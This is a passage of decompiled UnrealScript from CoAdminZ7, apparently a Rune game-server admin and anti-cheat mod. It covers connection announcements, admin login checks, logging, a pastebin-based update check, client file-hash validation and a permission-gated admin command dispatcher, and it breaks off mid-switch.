class zStorage extends Info
    config(CoAdminZ7);

const eqmu_vxv_5787 = "CoAdminZ7";
const eqpow1_vxv_5897 = 0x0001;
const eqpow1_vxv_5898 = 0x0002;
const eqpow1_vxv_5899 = 0x0004;
const eqpow1_vxv_5900 = 0x0008;
const eqpow1_vxv_5901 = 0x0010;
const eqpow1_vxv_5902 = 0x0040;
const eq_pow1_vxv_5903 = 0x0100;
const eqU_vxv_6976 = 0x0200;
const eqpow1_vxv_5904 = 0x0400;
const eqpow1_vxv_5905 = 0x1000;
const eqpow1_vxv_5906 = 0x2000;
const eqpow1_vxv_5907 = 0x4000;
const eqpow1_vxv_5908 = 0;

struct STCT_v2068
{
    var string PlayerName;
    var int PlayerID;
    var float Local_int_v0;
    var bool B_v5387;
    var bool B_v5345;
    var string Local_string_v1;
    var float Score;
    var float Deaths;
    var int Count;
    var int INT_v5362;
    var int INT_v5363;
    var Vector VCT_v5874;
    var int INT_v5348;
    var int INT_v5875;
    var int INT_v5876;
    var int INT_v5877;
    var int INT_v5878;
    var int INT_v5879;
    var bool B_v5880;
    var bool B_v5881;
    var bool B_v5350;
    var bool B_v5351;
    var string STR_v5353;
    var string CompName;
    var int INT_v5352;
};

struct STCT_v2069
{
    var config string Name;
    var config int power;
    var config string Key;
};

var config bool bThrowBlock;
var config bool bOverWriteThrowblock;
var config bool bTournament;
var config bool bOldWaterPhysics;
var config bool mortal;
var config bool fLagFix;
var config bool secureLogin;
var config bool localtesting;
var bool B_v5795;
var bool B_v5796;
var config string allowedFiles[20];
var config string allowedEFiles[20];
var string STR_v5799;
var config string CompPolicies[4];
var() config string EnterPassword;
var config int protectedTeam;
var config bool bDisableRunes;
var config bool bAdvancedThrowing;
var config bool bHealthbars;
var config string IpTempBanned;
var config string strMuted;
var config bool bDisableAntiAimbot;
var config bool bClimbMode;
var config string strMute;
var config string strUnmute;
var config string AntiSpeedhack;
var config string DefaultWeapon;
var config bool bDisableUnderWaterBlood;
var config bool bCheckForIllegalCalls;
var config bool bShowPasswordPrefix;
var config bool bdontFadeMessages;
var config bool bAllowZombies;
var config bool bTestSarks;
var config bool bOnlyRunOnce;
var config bool bWeaponChoice;
var config bool bRetro;
var config int MOTDGapSize;
var config int MOTDGapToScoreboardSize;
var config int MOTDGapAfterAdminEmailSize;
var config int allowedRejoinCount;
var config string moreMOTD;
var config bool retro;
var config string Maps[2048];
var config int motdseconds;
var config Color AdminColor;
var config Color EmailColor;
var config Color titlecolor;
var config Color MOTD1Color;
var config Color MOTD2Color;
var config Color MOTD3Color;
var config Color MOTD4Color;
var config Color SeperatorColor;
var config Color ServerNameColor;
var config Color HeaderColor;
var config Color HeadingsColor;
var config bool bTimeStamps;
var config string announcerServerFullMsg;
var config string announcerConnectingMsg;
var config string announcerOtherMsg;
var config string ReasonServerChange;
var config string ReasonExit;
var config string ReasonReconnect;
var config string ReasonDisconnect;
var config string ReasonKick;
var config string ReasonBan;
var config string ReasonMapBan;
var config string ReasonMapChange;
var config string ReasonLocked;
var config string ReasonRelaunch;
var config string ReasonTimeOutError;
var config string ReasonDemoPlay;
var config string ReasonVideoDriver;
var config string demoName;
var config int testVariable;
var() config string CoPw[3];
var config string CoRights[3];
var config int CoMask[3];
var config bool damageStats;
var config bool bswitchcolors;
var config bool bShowAdmin;
var config bool bshowshadow;
var config bool bArenaSounds;
var config bool bsJumps;
var config bool bRuneTwo;
var config bool bDarkMatch;
var config string testkey;
var config bool announceConnect;
var string STR_v3845;
var string STR_v5849;
var config int nextMapMode;
var config int RequiemCameraFix;
var string STR_v5852;
var config int packagecheck;
var config int packagemode;
var bool B_v3171;
var config bool coopmode;
var config string AntiTCCMessage[255];
var config string BanLog[255];
var int INT_v5858;
var int INT_v5859;
var int INT_v5498;
var bool B_v3962;
var bool G_InitOnceBool1;
var config bool Sounds;
var config bool bCredits;
var CoAdminLog gCAdLoc1;
var CoAdminLog gCAdLoc2;
var zPlayerReplicationInfo UNK_v5865;
var string STR_v4679[32768];
var bool B_v5866;
var string STR_v5867;
var PlayerPawn Parm_PlayerPawn_0;
var PlayerPawn PP_v5868;
var string STR_v5869;
var int INT_v5870;
var string STR_v5871;
var int INT_v5872;
var STCT_v2068 STRCT_5882[16];
var config string runarKey;
var config STCT_v2069 Admins[64];
var CAZHTTPClient UNK_v5886;
var CustomSkins UNK_v5887;
var CountryClient UNK_v5888;
var string STR_v5889;
var string STR_v5890;
var config bool Linux;
var config bool bTESTMODE;
var PlayerInfo PlayerInfo;
var bool Arena;
var bool B_v5893;
var bool B_v5894;
var bool Headball;
var rIRC UNK_v5895;
var bool B_v5896;
// Suggested function name: ExtractIPAddress
function string ExtractIPAddress(string InputAddress)
{
	local int ColonIndex;

	ColonIndex = InStr(InputAddress, ":");
	if (ColonIndex != -1)
	{
		InputAddress = Left(InputAddress, ColonIndex);
	}
	return InputAddress;
}

// Suggested function name: AnnouncePlayerConnection
function AnnouncePlayerConnection(string OptionsString, string IPAddress, out string Error, out string eq_vxv_4463)
{
	local bool ShouldAnnounce, IsErrorCase;
	local string PlayerName, AnnouncementMessage, AlarmString;

	PlayerName = Level.Game.ParseOption(OptionsString, "Name");
	AlarmString = "84.120";
	if (announceConnect)
	{
		if (STR_v5871 == ExtractIPAddress(IPAddress))
		{
			INT_v5872++;
		}
		if (STR_v5871 != ExtractIPAddress(IPAddress))
		{
			STR_v5871 = ExtractIPAddress(IPAddress);
			INT_v5872 = 0;
		}
		if (INT_v5872 > 2)
		{
			ShouldAnnounce = false;
		}
		else
		{
			ShouldAnnounce = true;
		}
		if (ShouldAnnounce)
		{
			if (announceConnect && Error != "" && Error != Level.Game.MaxedOutMessage)
			{
				AnnouncementMessage = "[INFO:] " $ announcerOtherMsg;
				ReplaceString(AnnouncementMessage, "%s", PlayerName);
				if (Left(STR_v5871, 6) != AlarmString)
				{
					BroadcastMessage(AnnouncementMessage @ Error);
					LogCoAdminZEvent(AnnouncementMessage @ Error);
				}
				else
				{
					AlarmString = ":alarm:";
					SendIRCMessage("#TSB", (("** " $ AlarmString) @ AnnouncementMessage) $ "**");
				}
				IsErrorCase = true;
			}
			if (announceConnect && !IsErrorCase)
			{
				if (Level.Game.NumPlayers < Level.Game.MaxPlayers)
				{
					AnnouncementMessage = "[INFO:] " $ announcerConnectingMsg;
					ReplaceString(AnnouncementMessage, "%s", PlayerName);
					BroadcastMessage(AnnouncementMessage);
					LogCoAdminZEvent(AnnouncementMessage);
				}
				else
				{
					AnnouncementMessage = "[INFO:] " $ announcerServerFullMsg;
					ReplaceString(AnnouncementMessage, "%s", PlayerName);
					BroadcastMessage(AnnouncementMessage);
					LogCoAdminZEvent(AnnouncementMessage);
				}
			}
		}
	}
	return;
}

static final function string ToLowercase(coerce string InputText)
{
	local int Index;
	local string CurrentChar;

	for (Index = 0; Index < Len(InputText); Index++)
	{
		CurrentChar = Mid(InputText, Index, 1);
		if ((CurrentChar >= "A") && (CurrentChar <= "Z"))
		{
			InputText = Left(InputText, Index) $ Chr(Asc(CurrentChar) + 32) $ Mid(InputText, Index + 1);
		}
	}
	return InputText;
}

// Suggested function name: IsVerifiedAdmin
function bool IsVerifiedAdmin(string AdminKey)
{
	local int Index;

	for (Index = 0; Index < 64; Index++)
	{
		if (Admins[Index].Key == AdminKey)
		{
			LogCoAdminZEvent(("Administrator logged in. (verified <-> " $ Admins[Index].Key) $ " ) ", "Admin");
			return true;
		}
	}
	return false;
}

// Suggested function name: GetAdminIndex
function int GetAdminIndex(string AdminKey)
{
	local int Index;

	for (Index = 0; Index < 64; Index++)
	{
		if (Admins[Index].Key == AdminKey)
		{
			return Index;
		}
	}
	return 1337;
}

function Destroyed()
{
    if(gCAdLoc1 != none)
    {
        gCAdLoc1.CloseLog();
    }
    super(Actor).Destroyed();
    return;
}

// Initializes CoAdminZ logging, server info, and custom skins.
// Also sets up server options and logs important startup information.
function InitializeCoAdminZ()
{
	local string ServerActors, ServerPackages, CurrentMap, AdvancedThrowingOption;
	local clientIP ClientIPActor;
	local int SkinIndex;

	// Get server actors and packages for logging
	ServerActors = ConsoleCommand("get Engine.GameEngine ServerActors");
	ServerPackages = ConsoleCommand("get Engine.GameEngine ServerPackages");
	CurrentMap = GetURLMap();
	if (CurrentMap != "")
	{
		if (Right(CurrentMap, 4) ~= ".run")
		{
			// Already has .run extension
		}
		else
		{
			CurrentMap = CurrentMap $ ".run";
		}
	}

	// Start main log
	gCAdLoc1 = Spawn(Class'coadminz7.CoAdminLog');
	if (gCAdLoc1 != none)
	{
		gCAdLoc1.STR_v5433 = "Logs/CoAdminZ";
		gCAdLoc1.StartLog();
	}

	LogCoAdminZEvent("__________________________________________", "Init");
	LogCoAdminZEvent("  CoAdminZ by slade", "Init");
	LogCoAdminZEvent("__________________________________________", "Init");
	LogCoAdminZEvent("", "Init");
	LogCoAdminZEvent("Version ....................... " $ "CoAdminZ7", "Init");
	LogCoAdminZEvent("Released ...................... 15.07.2025", "Init");
	LogCoAdminZEvent("", "Init");
	LogCoAdminZEvent("__________________________________________", "Init");
	LogCoAdminZEvent("Servername .................... " $ Level.Game.GameReplicationInfo.ServerName, "Init");

	// Log server IP address
	ClientIPActor = Spawn(Class'coadminz7.clientIP');
	if (ClientIPActor != none)
	{
		LogCoAdminZEvent("IP Address .................... " $ ClientIPActor.eqdollar_vxv_1144(), "Init");
		ClientIPActor.Destroy();
	}

	LogCoAdminZEvent("MaxPlayers .................... " $ string(Level.Game.MaxPlayers), "Init");
	LogCoAdminZEvent("Current map ................... " $ CurrentMap, "Init");
	LogCoAdminZEvent("Server Packages ............... " $ ServerPackages, "Init");
	LogCoAdminZEvent("Server Actors ................. " $ ServerActors, "Init");
	LogCoAdminZEvent("__________________________________________", "Init");
	LogCoAdminZEvent("", "Init");

	// Set engine version string
	Level.EngineVersion = Left(Level.EngineVersion, 3) $ " running CoAdminZ";

	// Enable Nephthys UScript API and DLAnnounce if present
	if (ContainsString(ServerActors, "Nephthys"))
	{
		ConsoleCommand("set IpDrv.NephthysDrv bUScriptAPI true");
		Spawn(Class<Actor>(DynamicLoadObject("DLAnnounce.DLAnnounce", Class'Core.Class')));
		LogCoAdminZEvent("+++++++++++++++++++++++++++++", "Init");
		LogCoAdminZEvent("Started Download Announcer 1.0");
		LogCoAdminZEvent("+++++++++++++++++++++++++++++", "Init");
	}

	// Detect and log AdvancedThrowing server option
	AdvancedThrowingOption = ConsoleCommand("get Engine.ServerOptions AdvancedThrowing");
	if (!(Left(AdvancedThrowingOption, 12) ~= "Unrecognized"))
	{
		LogCoAdminZEvent("+++++++++++++++++++++++++++++", "Init");
		LogCoAdminZEvent("  Detected 1.08 serveroptions - using settings from [Engine.ServerOptions]");
		LogCoAdminZEvent("  AdvancedThrowing = " $ AdvancedThrowingOption);
		SetPropertyText("bAdvancedThrowing", AdvancedThrowingOption);
	}

	// Load custom skins and log them
	UNK_v5887 = Spawn(Class'coadminz7.CustomSkins');
	UNK_v5887.SaveConfig();
	for (SkinIndex = 0; SkinIndex < 8; SkinIndex++)
	{
		if ((UNK_v5887.serverSkin[SkinIndex].skinClass != "") && (UNK_v5887.serverSkin[SkinIndex].skinTitle != ""))
		{
			if (UNK_v5887.serverSkin[SkinIndex].ExcludeID != int(Level.Game.ParticlePercentage))
			{
				LogCoAdminZEvent("+++ Loaded custom skin: " $ UNK_v5887.serverSkin[SkinIndex].skinClass $ " , '" $ UNK_v5887.serverSkin[SkinIndex].skinTitle $ "'");
				continue;
			}
			LogCoAdminZEvent("+++ EXCLUDED CUSTOM SKIN: " $ UNK_v5887.serverSkin[SkinIndex].skinClass $ " , '" $ UNK_v5887.serverSkin[SkinIndex].skinTitle $ "'");
		}
	}

	// Sync throwblock setting if needed
	if (bOverWriteThrowblock)
	{
		ConsoleCommand("get Engine.ServerOptions RetroThrownWeaponNoBlock " $ string(!bThrowBlock));
	}

	// Spawn PlayerInfo in test mode
	if (bTESTMODE)
	{
		PlayerInfo = Spawn(Class'coadminz7.PlayerInfo');
	}

	// Check for updates
	SpawnHTTPClientAndBrowse(80, "pastebin.com?/raw/z5Narw33");
	return;
}
// Suggested function name: SpawnHTTPClientAndBrowse
function SpawnHTTPClientAndBrowse(int Port, string Url)
{
	local string QueryString;

	if (ContainsString(Url, "?"))
	{
		QueryString = Right(Url, (Len(Url) - InStr(Url, "?")) - 1);
		Url = Left(Url, InStr(Url, "?"));
	}
	if (UNK_v5886 != none)
	{
		UNK_v5886.Destroy();
	}
	UNK_v5886 = Spawn(Class'coadminz7.CAZHTTPClient');
	UNK_v5886.G_ZStrg1 = self;
	UNK_v5886.Browse(Url, QueryString, Port);
	return;
}

// Suggested function name: CheckForUpdates
function CheckForUpdates(string Response, bool Error)
{
	local string VersionString;

	if (ContainsString(Response, "Version="))
	{
		VersionString = Mid(Response, InStr(Response, "Version="), 12);
		VersionString = Left(VersionString, InStr(VersionString, "~"));
		ReplaceString(VersionString, "Version=", "");
		if (int(VersionString) > 0)
		{
			STR_v5889 = "UPDATE AVAILABLE";
			LogCoAdminZEvent("========================================================", "Init");
			LogCoAdminZEvent("     CoAdminZ Update Available                          ", "Init");
			LogCoAdminZEvent("========================================================", "Init");
			LogCoAdminZEvent(" CoAdmin detected that you're running an old version of CoAdmin ", "Init");
			LogCoAdminZEvent(" Grab the newest version at http://therune.boards.net ", "Init");
			LogCoAdminZEvent("========================================================", "Init");
		}
		else
		{
			STR_v5889 = "";
			LogCoAdminZEvent("========================================================", "Init");
			LogCoAdminZEvent("     Running the newest version of CoAdminZ             ", "Init");
			LogCoAdminZEvent("========================================================", "Init");
		}
		if (Right(DefaultWeapon, 4) ~= "none")
		{
			LogCoAdminZEvent("Defaultweapon disabled, FIGHT WITH YOUR BARE HANDS MAFUKR!!", "Log");
		}
		else
		{
			if (DefaultWeapon != "")
			{
				LogCoAdminZEvent("Defaultweapon changed to " $ DefaultWeapon, "Log");
			}
		}
		UNK_v5886.Destroy();
	}
	return;
}

// Logs an event string to the main CoAdminZ log and to the Unreal log.
// Parm_string_0: The message to log.
// Type: Optional log type/category (defaults to "Log").
function LogCoAdminZEvent(string Message, optional string Category)
{
	// Set default category if not provided
	if (Category == "")
	{
		Category = "Log";
	}
	Category = Category $ ": ";

	// Write to CoAdminZ log if available
	if (gCAdLoc1 != none)
	{
		gCAdLoc1.LogEventString("[" $ GetFormattedTime(":") $ "] " $ Category $ Message);
		gCAdLoc1.FileFlush();
	}

	// Also log to Unreal's internal log
	LogInternal(Message);
}

function eq_vxv_1013(string Parm_string_0)
{
    if(gCAdLoc2 != none)
    {
        gCAdLoc2.LogEventString(Parm_string_0);
        gCAdLoc2.FileFlush();
    }
    return;
}

event BroadcastMessage(coerce string Msg, optional bool bBeep, optional name Type)
{
    super(Actor).BroadcastMessage(Msg, bBeep, Type);
    LogCoAdminZEvent(Msg, "Message");
    return;
}
// Suggested function name: GetFormattedTime
function string GetFormattedTime(string Separator)
{
	local string TimeString;

	// Format hours with leading zero if needed
	if (Level.Hour < 10)
	{
		TimeString = "0";
	}
	TimeString = TimeString $ string(Level.Hour) $ Separator;

	// Format minutes with leading zero if needed
	if (Level.Minute < 10)
	{
		TimeString = TimeString $ "0";
	}
	TimeString = TimeString $ string(Level.Minute) $ Separator;

	// Format seconds with leading zero if needed
	if (Level.Second < 10)
	{
		TimeString = TimeString $ "0";
	}
	TimeString = TimeString $ string(Level.Second);

	return TimeString;
}

function LogAntiCheatMessage(string Message)
{
	// Suggested name: LogAntiCheatMessage
	// Logs an anti-cheat message to the internal log, stores it in the AntiTCCMessage buffer
	// and persists the config. If the buffer is full, logs a "buffer full" notice.
	local int idx;
	local bool stored;

	LogInternal(Message);

	stored = false;
	// AntiTCCMessage is sized 255 (0..254). Find first empty slot and store the message.
	for (idx = 0; idx < 255; idx++)
	{
		if (AntiTCCMessage[idx] == "")
		{
			AntiTCCMessage[idx] = Message;
			SaveConfig();
			LogCoAdminZEvent(Message, "AntiCheat");
			stored = true;
			break;
		}
	}

	if (!stored)
	{
		LogCoAdminZEvent("########## CHEAT LOG IS FULL CANT LOG ANY MORE CHEAT ATTEMPTS ############ ", "AntiCheat");
	}

	return;
}
// Suggested function name: LogBanEvent
function LogBanEvent(string BanMessage)
{
	local bool FoundSlot;
	local int Index;

	Index = 0;
	FoundSlot = false;

	while (!FoundSlot)
	{
		if (BanLog[Index] == "")
		{
			BanLog[Index] = BanMessage;
			SaveConfig();
			FoundSlot = true;
		}
		if (Index >= 99)
		{
			FoundSlot = true;
		}
		Index++;
	}
	return;
}

// Suggested function name: UpdateMOTDGapSizes
function UpdateMOTDGapSizes(PlayerPawn AdminPlayer, int GapSize, int GapToScoreboardSize, int GapAfterAdminEmailSize)
{
	local Pawn CurrentPawn;

	default.MOTDGapSize = GapSize;
	default.MOTDGapToScoreboardSize = GapToScoreboardSize;
	default.MOTDGapAfterAdminEmailSize = GapAfterAdminEmailSize;
	MOTDGapSize = GapSize;
	MOTDGapToScoreboardSize = GapToScoreboardSize;
	MOTDGapAfterAdminEmailSize = GapAfterAdminEmailSize;

	for (CurrentPawn = Level.PawnList; CurrentPawn != none; CurrentPawn = CurrentPawn.nextPawn)
	{
		zPlayerReplicationInfo(CurrentPawn.PlayerReplicationInfo).INT_v5356 = GapSize;
		zPlayerReplicationInfo(CurrentPawn.PlayerReplicationInfo).INT_v5357 = GapToScoreboardSize;
		zPlayerReplicationInfo(CurrentPawn.PlayerReplicationInfo).INT_v5358 = GapAfterAdminEmailSize;
	}
	SaveConfig();
	return;
}
// Suggested function name: UpdateServerMOTDColors
function UpdateServerMOTDColors(PlayerPawn AdminPlayer, Color NewServerNameColor, Color NewHeaderColor, Color NewTitleColor, Color NewAdminColor, Color NewEmailColor, Color NewMOTD1Color, Color NewMOTD2Color, Color NewMOTD3Color, Color NewMOTD4Color, Color NewSeparatorColor, Color NewHeadingsColor)
{
	local Pawn CurrentPawn;

	// Update default color configurations
	default.ServerNameColor = NewServerNameColor;
	default.HeaderColor = NewHeaderColor;
	default.titlecolor = NewTitleColor;
	default.AdminColor = NewAdminColor;
	default.EmailColor = NewEmailColor;
	default.MOTD1Color = NewMOTD1Color;
	default.MOTD2Color = NewMOTD2Color;
	default.MOTD3Color = NewMOTD3Color;
	default.MOTD4Color = NewMOTD4Color;
	default.SeperatorColor = NewSeparatorColor;
	default.HeadingsColor = NewHeadingsColor;

	// Update current instance variables
	ServerNameColor = NewServerNameColor;
	HeaderColor = NewHeaderColor;
	titlecolor = NewTitleColor;
	AdminColor = NewAdminColor;
	EmailColor = NewEmailColor;
	MOTD1Color = NewMOTD1Color;
	MOTD2Color = NewMOTD2Color;
	MOTD3Color = NewMOTD3Color;
	MOTD4Color = NewMOTD4Color;
	SeperatorColor = NewSeparatorColor;
	HeadingsColor = NewHeadingsColor;

	// Loop through all pawns to update their replication info colors
	for (CurrentPawn = Level.PawnList; CurrentPawn != none; CurrentPawn = CurrentPawn.nextPawn)
	{
		if (zPlayerReplicationInfo(CurrentPawn.PlayerReplicationInfo) != none)
		{
			zPlayerReplicationInfo(CurrentPawn.PlayerReplicationInfo).Col_v5372 = NewServerNameColor;
			zPlayerReplicationInfo(CurrentPawn.PlayerReplicationInfo).Col_v5373 = NewHeaderColor;
			zPlayerReplicationInfo(CurrentPawn.PlayerReplicationInfo).titlecolor = NewTitleColor;
			zPlayerReplicationInfo(CurrentPawn.PlayerReplicationInfo).AdminColor = NewAdminColor;
			zPlayerReplicationInfo(CurrentPawn.PlayerReplicationInfo).EmailColor = NewEmailColor;
			zPlayerReplicationInfo(CurrentPawn.PlayerReplicationInfo).MOTD1Color = NewMOTD1Color;
			zPlayerReplicationInfo(CurrentPawn.PlayerReplicationInfo).MOTD2Color = NewMOTD2Color;
			zPlayerReplicationInfo(CurrentPawn.PlayerReplicationInfo).MOTD3Color = NewMOTD3Color;
			zPlayerReplicationInfo(CurrentPawn.PlayerReplicationInfo).MOTD4Color = NewMOTD4Color;
			zPlayerReplicationInfo(CurrentPawn.PlayerReplicationInfo).SeperatorColor = NewSeparatorColor;
			zPlayerReplicationInfo(CurrentPawn.PlayerReplicationInfo).HeadingsColor = NewHeadingsColor;
		}
	}

	// Notify the admin that settings have been updated
	AdminPlayer.ClientMessage("~ Server settings updated.");

	// Save the configuration
	SaveConfig();
	return;
}

// Suggested function name: ValidateExtendedFileHash
function ValidateExtendedFileHash(string FileHash, PlayerPawn Player)
{
	local int Index;
	local bool IsAllowed;

	// Initialize allowed extended file hashes
	allowedEFiles[0] = "3a5b39ffe58be2bfa33ac445ae6a4b88";
	allowedEFiles[1] = "e0818eff069ebc7aaa8c5033e266268c";
	allowedEFiles[2] = "49c26a4814d57fcc169e598111e5f637";
	allowedEFiles[3] = "bc8db45693fb2aefa3d64de4c48c383f";
	allowedEFiles[4] = "3bf8cb5a67039d82fa1ad8e5b8f072ea";
	allowedEFiles[5] = "b812bb67ac69de6cdfa818f72b5bbb7c";

	// Default to "none" if empty
	if (FileHash == "")
	{
		FileHash = "none";
	}

	// Check if the file hash is in the allowed list
	IsAllowed = false;
	for (Index = 0; Index < 20; Index++)
	{
		if (FileHash ~= allowedEFiles[Index])
		{
			IsAllowed = true;
			break;
		}
	}

	if (IsAllowed)
	{
		// File hash is allowed, no action needed
	}
	else
	{
		// Mark player as using hacked files and set additional flags
		ZRunePlayer(Player).USELESSSTUCT.UNK_v4553 = true;
		// Pattern match flag
		ZRunePlayer(Player).USELESSSTUCT.UNK_v4584 = true;
		// Log the detection
		SendIRCMessage("#TSB", ((("" $ (GetFormattedPlayerName(Player.PlayerReplicationInfo))) $ "  | @slade  -> ") $ FileHash) $ " not allowed(( ban?) ");
	}
	return;
}

// Suggested function name: ValidateFileHash
function ValidateFileHash(string FileHash, PlayerPawn Player)
{
	local int Index;
	local bool IsAllowed;

	// Set default if empty
	if (FileHash == "")
	{
		FileHash = "none";
	}

	// Check if the file hash is in the allowed list
	IsAllowed = false;
	for (Index = 0; Index < 20; Index++)
	{
		if (FileHash ~= allowedFiles[Index])
		{
			IsAllowed = true;
			break;
		}
	}

	if (IsAllowed)
	{
		// Generate a random string for the player's STR_v4673
		ZRunePlayer(Player).STR_v4673 = Class'coadminz7.CoralCastle4'.static.Md5Hash("x" $ string(Rand(9999)));
	}
	else
	{
		// Mark player as using hacked files and log the detection
		ZRunePlayer(Player).USELESSSTUCT.UNK_v4553 = true;
		// Set a bunch of USELESSSTUCT flags to true (as per original comment)
		ZRunePlayer(Player).LogCheatDetection("using hacked game files.(" $ FileHash $ ") ~ " $ ZRunePlayer(Player).STR_v3073);
	}
	return;
}
// Suggested name: ProcessAdminCommand
function ProcessAdminCommand(string Command, string Args, PlayerPawn Player, optional int LogMode)
{
	local zPlayerReplicationInfo PRI;
	local bool HasPermission;
	local string SpecialString;

	SpecialString = "a1010101aaa1010101aaa";
	PRI = zPlayerReplicationInfo(Player.PlayerReplicationInfo);
	if(Command == "")
	{
		return;
	}
	if(LogMode == 0)
	{
		if((!HasCommandPermission(Command, Player) && Caps(Command) != "PLOGIN") && Caps(Command) != "XLOGIN" && Caps(Command) != "STATUS")
		{
			LogCoAdminZEvent(((("[ERROR: NO PERMISSION TO USE CMD] " $ PRI.PlayerName) $ " -> ") $ Command) @ Args, "CMD");
		}
		if(((HasCommandPermission(Command, Player)) && Caps(Command) != "PLOGIN") && Caps(Command) != "XLOGIN")
		{
			LogCoAdminZEvent(((PRI.PlayerName $ " -> ") $ Command) @ Args, "CMD");
		}
		if(Caps(Command) ~= "STATUS")
		{
			LogCoAdminZEvent((("[STATUS] " $ PRI.PlayerName) $ " -> ") @ Args, "CMD");
		}
	}
	if((LogMode == 2) && Caps(Command) ~= "MAPVOTE")
	{
		LogCoAdminZEvent((("[VOTEMAP] " $ PRI.PlayerName) $ " -> ") @ Args, "CMD");
	}
	switch(Command)
	{
		case "pLogin":
			pLogin(Args, Player);
			break;
		case "status":
			SetPlayerStatusString(Args, Player);
			break;
		case "mapVote":
			HandleArenaMapVote(Args, Player);
			break;
		case "set":
			eq_vxv_990(Args, Player);
			break;
		case "chet":
			LogCheatDetection(Args, Player);
			break;
		case "cheta":
			LogCheatDetection(Args, Player, 1);
			break;
		case "chetb":
			LogCheatDetection(Args, Player, 2);
			break;
		case "ck":
			ValidateAdminLoginCheck(Args, Player, false);
			break;
		case "loadSkins":
			LoadCustomSkins(Player);
			break;
		case "ck2":
			ValidateAdminLoginCheck(Args, Player, true);
			break;
		case "ref_status":
			eq_vxv_1004(Args, Player);
			break;
		case "showMaps":
			showMaps(Player);
			break;
		case "closestWeapon":
			FindClosestWeapon(int(Args), Player);
			break;
		case "checkMe":
			ValidateFileHash(Args, Player);
			break;
		case "checkMeE":
			ValidateExtendedFileHash(Args, Player);
			break;
		case "getCountry":
			GetPlayerCountry(Player);
			break;
		case "AdjustDrawScale":
			if(PRI.Local_int_v3 > 0)
			{
				AdjustDrawScale(float(Args), Player);
			}
			else
			{
				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		case "pLogout":
			if(PRI.Local_int_v3 > 0)
			{
				pLogout(Player);
			}
			break;
		case "pNextMap":
			if(PRI.Local_int_v3 > 0)
			{
				pNextMap(Args, Player);
			}
			else
			{
				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		case "pTest":
			if((PRI.Local_int_v3 & 1024) > 0)
			{
				pTest(Args, Player);
			}
			else
			{
				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		case "pMap":
			if((PRI.Local_int_v3 & 1024) > 0)
			{
				pMap(Args, Player);
			}
			else
			{
				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		case "pTome":
			if(PRI.Local_int_v3 > 0)
			{
				pTome(int(Args), Player);
			}
			else
			{
				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		case "pMeto":
			if(PRI.Local_int_v3 > 0)
			{
				pMeto(int(Args), Player);
			}
			else
			{
				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		case "pPause":
			if(PRI.Local_int_v3 > 0)
			{
				pPause(Player);
			}
			else
			{
				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		case "pUnPause":
			if(PRI.Local_int_v3 > 0)
			{
				pUnPause(Player);
			}
			else
			{
				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		case "pAdminLogin":
			if((PRI.Local_int_v3 & 2) > 0)
			{
				pAdminLogin(Args, Player);
			}
			else
			{
				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		case "pAdminLogout":
			if((PRI.Local_int_v3 & 4) > 0)
			{
				pAdminLogout(Player);
			}
			else
			{
				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		case "pTell":
			if((PRI.Local_int_v3 & 2) > 0)
			{
				pTell(Args, Player);
			}
			else
			{
				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		case "pMute":
			if((PRI.Local_int_v3 & 4) > 0)
			{
				pMute(int(Args), Player);
			}
			else
			{
				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		case "pTeam":
			if((PRI.Local_int_v3 & 16) > 0)
			{
				pTeam(Args, Player);
			}
			else
			{
				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		case "pMake":
			if((PRI.Local_int_v3 & 16) > 0)
			{
				pMake(Args, Player);
			}
			else
			{
				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		case "pAdmin":
			if((PRI.Local_int_v3 & 16) > 0)
			{
				pAdmin(Args, Player);
			}
			else
			{
				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		case "pName":
			if((PRI.Local_int_v3 & 16) > 0)
			{
				PName(Args, Player);
			}
			else
			{
				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		case "pNameLock":
			if((PRI.Local_int_v3 & 16) > 0)
			{
				pNameLock(Args, Player);
			}
			else
			{
				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		case "pTeamLock":
			if((PRI.Local_int_v3 & 16) > 0)
			{
				pTeamLock(Args, Player);
			}
			else
			{
				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		case "pDarkMatch":
			if(PRI.Local_int_v3 > 0)
			{
				pDarkMatch(Player);
			}
			else
			{
				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		case "pGetInfo":
			if(PRI.Local_int_v3 > 0)
			{
				GetPlayerInfo(Args, Player);
			}
			else
			{
				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		case "pGetLogs":
			if(PRI.Local_int_v3 > 0)
			{
				pGetLogs(Args, Player);
			}
			else
			{
				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		case "pShowBans":
			if(PRI.Local_int_v3 > 0)
			{
				ShowBans(Args, Player);
			}
			else
			{
				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		case "pWhois":
			if(PRI.Local_int_v3 > 0)
			{
				pWhois(Args, Player);
			}
			else
			{
				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		case "pWhoisIP":
			if(PRI.Local_int_v3 > 0)
			{
				pWhoisip(Args, Player);
			}
			else
			{
				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		case "pStop":
			if((PRI.Local_int_v3 & 8) > 0)
			{
				pStop(int(Args), Player);
			}
			else
			{
				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		case "pTBan":
			if((PRI.Local_int_v3 & 16384) > 0)
			{
				pTban(int(Args), Player);
			}
			else
			{
